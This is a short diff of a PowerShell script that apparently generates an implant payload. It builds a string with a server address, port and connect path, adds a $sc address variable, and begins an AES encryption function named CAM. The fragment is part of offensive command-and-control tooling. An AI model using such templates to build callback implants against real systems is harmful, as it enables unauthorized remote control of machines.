@@ -20,6 +20,7 @@ if ($Insecure.IsPresent) {
     $ssl = ''
 }
 $command = ''+$ssl+'
+$sc="'+$ipv4address+":"+$serverport+'"
 $s="'+$ipv4address+":"+$serverport+'/'+$connect+'"
 function CAM ($key,$IV){
 $a = New-Object -TypeName "System.Security.Cryptography.RijndaelManaged"
